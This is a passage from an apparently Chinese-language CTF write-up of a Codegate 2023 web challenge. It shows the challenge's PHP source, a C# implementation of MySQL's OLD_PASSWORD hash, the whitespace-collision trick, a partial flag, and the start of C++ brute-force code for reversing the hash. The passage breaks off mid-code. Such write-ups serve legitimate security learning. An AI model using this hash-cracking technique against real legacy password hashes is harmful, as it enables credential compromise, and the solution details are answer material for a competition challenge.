class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (substr($v1, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;codegate2023&amp;#123;&amp;quot;&lt;/span&gt; || substr($v1, -&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;i_love_you&amp;#125;&amp;quot;&lt;/span&gt; ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        substr($v2, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;codegate2023&amp;#123;&amp;quot;&lt;/span&gt; || substr($v2, -&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;) !== &lt;span class=&#34;string&#34;&gt;&amp;quot;i_love_you&amp;#125;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;fall in love~&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v1 == $v2) die(&lt;span class=&#34;string&#34;&gt;&amp;quot;are you kidding me?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v1 = hashPasswordOld($v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v2 = hashPasswordOld($v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $v3 = hashPasswordOld($flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v3 !== &lt;span class=&#34;string&#34;&gt;&amp;quot;6368616368613230&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag verification failed.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v1 == null &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; $v2 == null)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(&lt;span class=&#34;string&#34;&gt;&amp;quot;What the hell here?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v1 == $v2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($v2 == $v3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            die($flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        die(substr($flag, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, strlen($flag) / &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    die(&lt;span class=&#34;string&#34;&gt;&amp;quot;Try harder...&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show_source(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是v1和v2和v3经过hash得到的值都一样才能拿到完整flag。&lt;br&gt;对于OLD_PASSWORD的算法，网上有很多实现，这里有一个C#版本的：&lt;/p&gt;
&lt;figure class=&#34;highlight csharp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Online C# Editor for free&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// Write, Edit and Run your C# code using C# Online Compiler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; System;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;HelloWorld&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;mysql_old_password&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; sPassword&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32[] result = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; UInt32[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt; bDebug = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32 nr = (UInt32)&lt;span class=&#34;number&#34;&gt;1345345333&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; = (UInt32)&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, nr2 = (UInt32)&lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32 tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;char&lt;/span&gt; [] password = sPassword.ToCharArray();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; sPassword.Length; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (password[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt; || password[i] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\t&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = (UInt32)password[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nr ^= (((nr &amp;amp; &lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;) + &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt;) * tmp) + (nr &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nr2 += (nr2 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; ) ^ nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(&lt;span class=&#34;string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(nr.ToString(&lt;span class=&#34;string&#34;&gt;&amp;quot;X&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(nr2.ToString(&lt;span class=&#34;string&#34;&gt;&amp;quot;X&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine(&lt;span class=&#34;string&#34;&gt;&amp;quot;---&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; += tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    UInt32 mask = (((UInt32)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;) - (UInt32)&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// 111....11, 31bits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = nr &amp;amp; mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = nr2 &amp;amp; mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; hash = String.Format(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;0:X&amp;#125;&amp;#123;1:X&amp;#125;&amp;quot;&lt;/span&gt;, result[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], result[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; hash.ToLower();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Main&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;[] args&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine (mysql_old_password(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaa&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，v1和v2的hash值碰撞只需要加入空格就可以：因为该算法完全忽略空格和制表符。&lt;br&gt;这样前一半flag就知道了：&lt;code&gt;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&lt;/code&gt;&lt;br&gt;核心问题在于使v2的hash值等于&lt;code&gt;6368616368613230&lt;/code&gt;，v2必须以&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;结尾，我们唯一能改变的就是中间的字符串。&lt;br&gt;经过搜寻，找到一个帖子：&lt;a href=&#34;https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis&#34;&gt;mysql-old-password-cryptanalysis&lt;/a&gt;&lt;br&gt;里面给出了一段逆向推导nr与nr2的代码，以及一篇分析该算法的论文：F. Muller and T. Peyrin “Cryptanalysis of T-Function-Based Hash Functions” in International Conference on Information Security and Cryptology - ICISC 2006&lt;br&gt;不过需要注意的是该论文中的算法和实际算法有一个微小差异：nr2对应公式的&lt;code&gt;=&lt;/code&gt;应为&lt;code&gt;+=&lt;/code&gt;。&lt;br&gt;逆向计算nr&amp;#x2F;nr2：&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pre&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; level = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; level; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; &lt;span class=&#34;string&#34;&gt;&amp;quot;-&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;bruteforce&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;comment&#34;&gt;/*debug only!*/&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; level = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; charset[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// sorted by ascii&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//这里的代码假设只有以上字符存在，事实上完全没有必要：ascii 32-127都可以。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;oldpw_rev&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;              &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; c, &lt;span 